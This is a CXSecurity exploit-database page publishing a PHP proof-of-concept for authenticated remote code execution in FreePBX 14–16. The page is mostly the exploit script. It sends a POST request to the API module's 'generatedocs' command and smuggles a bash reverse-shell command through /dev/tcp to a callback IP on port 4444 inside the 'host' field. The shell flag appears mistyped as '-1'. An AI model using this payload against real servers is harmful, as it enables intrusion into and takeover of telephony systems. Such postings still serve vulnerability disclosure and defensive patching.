---
title: FreePBX 16 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060013
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-05
fetch_date: 2025-10-06T16:55:16.402573
---

# FreePBX 16 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **FreePBX 16 Remote Code Execution** **2024.06.04**  Credit:  **[Cold z3ro](https://cxsecurity.com/author/Cold%2Bz3ro/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: FreePBX 16 - Remote Code Execution (RCE) (Authenticated)
# Exploit Author: Cold z3ro
# Date: 6/1/2024
# Tested on: 14,15,16
# Vendor: https://www.freepbx.org/
<?php
///
/// FREEPBX [14,15,16] API Module Authenticated RCE
/// Orginal Difcon || https://www.youtube.com/watch?v=rqFJ0BxwlLI
/// Cod[3]d by Cold z3ro
///
$url = "10.10.10.186"; // remote host
$backconnectip = "192.168.0.2";
$port = "4444";
$PHPSESSID = "any valid session even extension";
echo "checking $url\n";
$url = trim($url);
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, 'http://'.$url.'/admin/ajax.php?module=api&command=generatedocs');
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_CUSTOMREQUEST, 'POST');
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, 0);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, 0);
curl\_setopt($ch, CURLOPT\_CONNECTTIMEOUT, 2);
curl\_setopt($ch, CURLOPT\_TIMEOUT, 2);
curl\_setopt($ch, CURLOPT\_HTTPHEADER, [
'Referer: http://'.$url.'/admin/config.php?display=api',
'Content-Type: application/x-www-form-urlencoded',
]);
curl\_setopt($ch, CURLOPT\_COOKIE, 'PHPSESSID='.$PHPSESSID);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, 'scopes=rest&host=http://'.$backconnectip.'/$(bash -1 >%26 /dev/tcp/'.$backconnectip.'/4444 0>%261)');
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, false);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
echo $response = curl\_exec($ch)."\n";
curl\_close($ch);
?>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060013)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top